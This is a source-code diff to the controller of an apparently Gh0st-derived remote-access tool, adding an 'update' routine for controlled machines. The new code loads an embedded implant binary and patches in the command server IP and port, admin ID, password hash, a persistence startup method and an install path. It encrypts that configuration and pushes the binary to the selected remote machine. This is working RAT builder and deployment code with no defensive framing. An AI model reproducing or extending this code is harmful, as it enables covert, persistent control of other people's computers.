@@ -48,6 +48,7 @@
 #include <ServerServiceWrapper.h>
 #include "CDlgFileSend.h"
 #include "CClientListDlg.h"
+#include "CUpdateDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -1781,17 +1782,72 @@ void CMy2015RemoteDlg::OnOnlineMessage()
 
 void CMy2015RemoteDlg::OnOnlineUpdate()
 {
+    context* ContextObject = nullptr;
+    EnterCriticalSection(&m_cs);
+    int n = m_CList_Online.GetSelectedCount();
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    if (Pos) {
+        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+        ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+    }
+	LeaveCriticalSection(&m_cs);
+    if (n != 1 || !ContextObject) {
+		MessageBox(_T("请选择一个被控程序进行升级!"), _T("提示"), MB_ICONWARNING);
+        return;
+    }
     if (IDYES != MessageBox(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"),
                             _T("提示"), MB_ICONQUESTION | MB_YESNO))
         return;
+    PBYTE buffer = nullptr;
+	ULONGLONG fileSize = 0;
+	CString clientType = ContextObject->GetAdditionalData(RES_CLIENT_TYPE).GetString();
+    if (clientType == "EXE") {
+        CUpdateDlg dlg(this);
+        if (dlg.DoModal() != IDOK)
+            return;
+        DWORD dwFileSize = 0;
+        BOOL is64bit = "64" == ContextObject->GetAdditionalData(RES_PROGRAM_BITS);
+        std::filesystem::path path = ContextObject->GetAdditionalData(RES_FILE_PATH).GetString();
+        std::string stem = path.stem().string();
+        std::string dirName = path.parent_path().filename().string();
+        BYTE* szBuffer = ReadResource(dlg.m_nSelected ? (is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86) :
+            (is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86), dwFileSize);
+        CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN };
+        int iOffset = MemoryFind((char*)szBuffer, (char*)g_ConnectAddress.Flag(), dwFileSize, g_ConnectAddress.FlagLen());
+        if (iOffset == -1) {
+            SAFE_DELETE(szBuffer);
+            return;
+        }
+        CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(szBuffer + iOffset);
+        dst->SetAdminId(GetMasterHash().c_str());
+        memcpy(dst->szFlag, GetMasterId().c_str(), 16);
+        strcpy_s(dst->szServerIP, THIS_CFG.GetStr("settings", "master", "127.0.0.1").c_str());
+        strcpy_s(dst->szPort, THIS_CFG.GetStr("settings", "port", "6543").c_str());
+        dst->Encrypt();
+        dst->iType = dlg.m_nSelected ? CLIENT_TYPE_ONE : CLIENT_TYPE_MEMDLL;
+        dst->iStartup = dlg.m_nSelected ? Startup_GhostMsc : Startup_TestRunMsc;
+        strcpy_s(dst->szBuildDate, DLL_VERSION);
+        memcpy(dst->pwdHash, GetPwdHash().c_str(), 64);
+        strcpy_s(dst->installDir, dirName.c_str());
+        strcpy_s(dst->installName, stem.c_str());
 
-    Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
-    ULONGLONG fileSize = buf->length(true) - 6;
-    PBYTE buffer = new BYTE[fileSize + 9];
-    if (buffer) {
+		fileSize = dwFileSize;
+        buffer = new BYTE[fileSize + 9];
+		buffer[0] = COMMAND_UPDATE;
+        memcpy(buffer + 1, &fileSize, 8);
+		memcpy(buffer + 9, szBuffer, fileSize);
+		SAFE_DELETE_ARRAY(szBuffer);
+    }
+    else if (clientType == "DLL") {
+        Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
+        fileSize = buf->length(true) - 6;
+        buffer = new BYTE[fileSize + 9];
         buffer[0] = COMMAND_UPDATE;
         memcpy(buffer + 1, &fileSize, 8);
         memcpy(buffer + 9, buf->c_str() + 6, fileSize);
+    }
+
+    if (buffer) {
         SendSelectedCommand((PBYTE)buffer, 9 + fileSize);
         delete[] buffer;
     }
